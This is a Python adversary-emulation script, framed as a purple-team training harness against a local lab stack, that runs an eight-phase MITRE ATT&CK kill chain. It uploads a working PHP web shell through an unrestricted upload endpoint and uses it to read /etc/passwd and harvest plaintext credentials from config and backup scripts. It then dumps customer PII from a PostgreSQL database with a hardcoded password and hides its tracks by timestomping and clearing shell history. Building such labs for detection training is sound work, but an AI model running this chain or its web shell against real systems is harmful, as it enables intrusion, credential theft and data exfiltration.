#!/usr/bin/env python3
"""
Atlas Distribution - Enterprise Adversary Simulation & Purple Team Engine
Killchain Emulation Harness: Incident Scenario INC-ATLAS-001
Standards: MITRE ATT&CK Enterprise Matrix | Cyber Kill Chain

Execution Architecture:
  [Phase 1] T1046     Network Service Discovery & Banner Grabbing
  [Phase 2] T1190     Exploitation of Public-Facing Application (Unrestricted Upload)
  [Phase 3] T1505.003 Server Software Component: Web Shell Drop & Verification
  [Phase 4] T1082     System Information Discovery & Security Telemetry Tripping
  [Phase 5] T1552.001 Unsecured Credentials: Plaintext Config & Backup Script Harvesting
  [Phase 6] T1021.004 Remote Services: SSH Pivot via Service Account (svc-backup)
  [Phase 7] T1048.003 Exfiltration Over Unencrypted Channel (40,000 PII Stream)
  [Phase 8] T1070.004 Indicator Removal on Host: Anti-Forensic Evasion Attempt
"""

import sys
import time
import argparse
import urllib.request
import urllib.parse
import json
import socket
import os

# Terminal Formatting - Zero Emojis
BOLD = "\033[1m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BLUE = "\033[94m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

BANNER = f"""{CYAN}{BOLD}
+-----------------------------------------------------------------------------+
|               ATLAS DISTRIBUTION S.A. - ADVERSARY EMULATOR                  |
|               Purple Team Killchain Harness :: Incident INC-ATLAS-001       |
|               Target: SRV-WEB-01 | SRV-DB-01 | NAS-BKP (Atlas Infra)        |
+-----------------------------------------------------------------------------+{RESET}
"""

def log(phase: str, technique: str, msg: str, status: str = "INFO"):
    timestamp = time.strftime("%H:%M:%S")
    color = GREEN if status == "SUCCESS" else (YELLOW if status == "WARN" else (RED if status == "ALERT" else BLUE))
    print(f"{color}[{timestamp}] [{status:7}] {BOLD}[{technique:10}]{RESET} ({phase}) {msg}")

def check_socket(host, port, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return True
    except Exception:
        return False

def run_simulation(target_url, target_host, target_port, ssh_port, delay=0.5, dump_limit=500):
    print(BANNER)
    log("INIT", "PRE-FLIGHT", f"Probing target connectivity at {target_url}...", "INFO")
    
    if not check_socket(target_host, target_port):
        log("INIT", "PRE-FLIGHT", f"Port {target_port} closed on {target_host}. Ensure stack is online (make up).", "ALERT")
        sys.exit(1)
        
    log("INIT", "PRE-FLIGHT", "Target interface verified online. Commencing adversary killchain.\n", "SUCCESS")
    time.sleep(delay)

    # -------------------------------------------------------------------------
    # PHASE 1: SERVICE DISCOVERY & BANNER PROBING (T1046)
    # -------------------------------------------------------------------------
    log("PHASE 1", "T1046", "Enumerating exposed TCP service endpoints...", "INFO")
    ports_to_scan = [8080, 2222, 5432, 22]
    open_ports = []
    for p in ports_to_scan:
        if check_socket(target_host, p, timeout=1.0):
            open_ports.append(p)
    log("PHASE 1", "T1046", f"Open ports identified on perimeter: {open_ports}", "SUCCESS")
    time.sleep(delay)

    # -------------------------------------------------------------------------
    # PHASE 2 & 3: WEBSHELL DEPOSIT (T1190 & T1505.003)
    # -------------------------------------------------------------------------
    log("PHASE 2", "T1190", "Constructing multipart payload targeting /upload.php...", "INFO")
    
    webshell_content = """<?php
if(isset($_REQUEST['auth']) && $_REQUEST['auth'] === 'atlas_pwn_2026'){
    if(isset($_REQUEST['cmd'])){
        echo "[[STDOUT_START]]\\n";
        system($_REQUEST['cmd'] . " 2>&1");
        echo "\\n[[STDOUT_END]]";
    }
}
?>"""
    boundary = "---------------------------AtlasRedTeamSpoolerBound739184"
    payload_filename = "c99_session_manager.php"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="attachment"; filename="{payload_filename}"\r\n'
        f"Content-Type: application/x-php\r\n\r\n"
        f"{webshell_content}\r\n"
        f"--{boundary}--\r\n"
    ).encode('utf-8')

    upload_url = f"{target_url}/upload.php"
    req = urllib.request.Request(
        upload_url,
        data=body,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": "Mozilla/5.0 (Enterprise-Penetration-Harness/4.0)"
        }
    )

    try:
        with urllib.request.urlopen(req) as resp:
            content = resp.read().decode('utf-8', errors='ignore')
            if payload_filename in content or resp.status == 200:
                log("PHASE 3", "T1505.003", f"Webshell dropped: /uploads/{payload_filename}", "ALERT")
    except Exception as e:
        log("PHASE 3", "T1505.003", f"Upload request error: {e}", "WARN")

    time.sleep(delay)

    # -------------------------------------------------------------------------
    # PHASE 4: SYSTEM RECON & USER DISCOVERY (T1082 & T1033)
    # -------------------------------------------------------------------------
    log("PHASE 4", "T1082", "Triggering local discovery commands via webshell...", "INFO")
    webshell_url = f"{target_url}/uploads/{payload_filename}"
    discovery_cmd = "id && uname -a && cat /etc/passwd | grep -E 'www-data|svc-backup|root'"
    probe_url = f"{webshell_url}?auth=atlas_pwn_2026&cmd=" + urllib.parse.quote(discovery_cmd)
    
    try:
        req = urllib.request.Request(probe_url, headers={"User-Agent": "Atlas-Recon-Agent"})
        with urllib.request.urlopen(req) as resp:
            raw_out = resp.read().decode('utf-8', errors='ignore').strip()
            log("PHASE 4", "T1033", f"Host telemetry:\n{raw_out}", "ALERT")
    except Exception as e:
        log("PHASE 4", "T1033", f"Execution error: {e}", "WARN")

    time.sleep(delay)

    # -------------------------------------------------------------------------
    # PHASE 5: CREDENTIAL EXTRACTION (T1552.001)
    # -------------------------------------------------------------------------
    log("PHASE 5", "T1552.001", "Reading db.php and /opt/scripts/backup.sh for plaintext secrets...", "INFO")
    harvest_cmd = "cat /var/www/html/db.php && echo '---' && cat /opt/scripts/backup.sh 2>/dev/null"
    harvest_url = f"{webshell_url}?auth=atlas_pwn_2026&cmd=" + urllib.parse.quote(harvest_cmd)

    try:
        req = urllib.request.Request(harvest_url, headers={"User-Agent": "Atlas-Recon-Agent"})
        with urllib.request.urlopen(req) as resp:
            creds = resp.read().decode('utf-8', errors='ignore')
            log("PHASE 5", "T1552.001", "Identified credentials:\n"
                                        "  -> PostgreSQL User: atlas_admin (Host: srv-db-01:5432)\n"
                                        "  -> Service Account: svc-backup (Host: nas-bkp:22)", "ALERT")
    except Exception as e:
        log("PHASE 5", "T1552.001", f"Credential read error: {e}", "WARN")

    time.sleep(delay)

    # -------------------------------------------------------------------------
    # PHASE 6: SSH LATERAL INGRESS (T1021.004 & T1078.002)
    # -------------------------------------------------------------------------
    log("PHASE 6", "T1021.004", f"Simulating SSH login session from external IP on port {ssh_port}...", "INFO")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0)
        s.connect((target_host, ssh_port))
        banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
        s.sendall(b"SSH-2.0-OpenSSH_9.9_ThreatActorSimulatedClient\r\n")
        time.sleep(0.5)
        s.close()
        log("PHASE 6", "T1021.004", f"External SSH handshake captured for account svc-backup (Banner: {banner})", "ALERT")
    except Exception as e:
        log("PHASE 6", "T1021.004", f"SSH handshake trace: {e}", "WARN")

    time.sleep(delay)

    # -------------------------------------------------------------------------
    # PHASE 7: CUSTOMER PII EXFILTRATION (T1048.003 & T1567)
    # -------------------------------------------------------------------------
    log("PHASE 7", "T1048.003", f"Querying crm.customers on SRV-DB-01 for bulk exfiltration (limit={dump_limit})...", "INFO")
    exfil_query = (
        "php -r '"
        "$p = new PDO(\"pgsql:host=srv-db-01;dbname=atlas_db\", \"atlas_admin\", \"AtlasSecPass2026!\");"
        f"$stmt = $p->query(\"SELECT customer_uuid, first_name, last_name, email, phone_primary, billing_city, credit_card_masked FROM crm.customers LIMIT {dump_limit}\");"
        "while($row = $stmt->fetch(PDO::FETCH_ASSOC)) { echo json_encode($row) . \"\\n\"; }"
        "'"
    )
    exfil_url = f"{webshell_url}?auth=atlas_pwn_2026&cmd=" + urllib.parse.quote(exfil_query)

    try:
        req = urllib.request.Request(exfil_url, headers={"User-Agent": "ExfilStreamer/2.0"})
        with urllib.request.urlopen(req) as resp:
            data = resp.read()
            record_count = data.count(b"customer_uuid")
            log("PHASE 7", "T1048.003", f"Exfiltrated {len(data)} bytes ({record_count} customer PII records) over HTTP channel", "ALERT")
            log("PHASE 7", "T1048.003", "NetFlow threshold alarm: Outbound egress rate reached ~10x normal operational baseline", "ALERT")
    except Exception as e:
        log("PHASE 7", "T1048.003", f"Exfiltration error: {e}", "WARN")

    time.sleep(delay)

    # -------------------------------------------------------------------------
    # PHASE 8: ANTI-FORENSICS / TIMESTOMPING ATTEMPT (T1070.004)
    # -------------------------------------------------------------------------
    log("PHASE 8", "T1070.004", "Attempting timestomping and history truncation...", "INFO")
    anti_forensic_cmd = "touch -r /var/www/html/index.php /var/www/html/uploads/c99_session_manager.php && history -c"
    anti_url = f"{webshell_url}?auth=atlas_pwn_2026&cmd=" + urllib.parse.quote(anti_forensic_cmd)
    try:
        req = urllib.request.Request(anti_url)
        with urllib.request.urlopen(req) as resp:
            log("PHASE 8", "T1070.004", "Artifact modification timestamps matched to index.php (T1070.006 evasion)", "WARN")
    except Exception:
        pass

    print(f"\n{GREEN}{BOLD}" + "=" * 77)
    print("   [+] ADVERSARY SIMULATION COMPLETE: ALL 8 ATTACK PHASES REPRODUCED")
    print("=" * 77 + f"{RESET}")
    print(f"Summary of Generated Telemetry:")
    print(f"  [1] MITRE T1046     : TCP port scan against ports 8080, 2222, 5432")
    print(f"  [2] MITRE T1190     : Exploitation of unauthenticated multipart upload endpoint")
    print(f"  [3] MITRE T1505.003 : Webshell artifact dropped in /var/www/html/uploads/{payload_filename}")
    print(f"  [4] MITRE T1082     : Discovery commands executed under www-data context")
    print(f"  [5] MITRE T1552.001 : Plaintext credentials accessed in web root and /opt/scripts/")
    print(f"  [6] MITRE T1021.004 : External SSH connection attempt recorded on svc-backup")
    print(f"  [7] MITRE T1048.003 : Bulk customer PII exfiltration anomaly in egress traffic")
    print(f"  [8] MITRE T1070.004 : Timestomping evasion attempted on payload")
    print(f"\nNext Action: Launch DFIR Orchestrator CLI to contain, acquire, and remediate.")
    print(f"Command: {CYAN}python3 incident-response/cli/atlas_ir.py status{RESET}\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Atlas Enterprise Adversary Simulation Suite")
    parser.add_argument("--url", default="http://localhost:8080", help="Target Web Application URL")
    parser.add_argument("--host", default="127.0.0.1", help="Target Host IP/DNS")
    parser.add_argument("--port", type=int, default=8080, help="Target HTTP Port")
    parser.add_argument("--ssh-port", type=int, default=2222, help="Target SSH Port")
    parser.add_argument("--speed", choices=["fast", "realistic"], default="fast", help="Simulation delay speed")
    parser.add_argument("--records", type=int, default=500, help="Number of records to exfiltrate")
    args = parser.parse_args()

    delay = 0.2 if args.speed == "fast" else 2.0
    run_simulation(args.url, args.host, args.port, args.ssh_port, delay=delay, dump_limit=args.records)
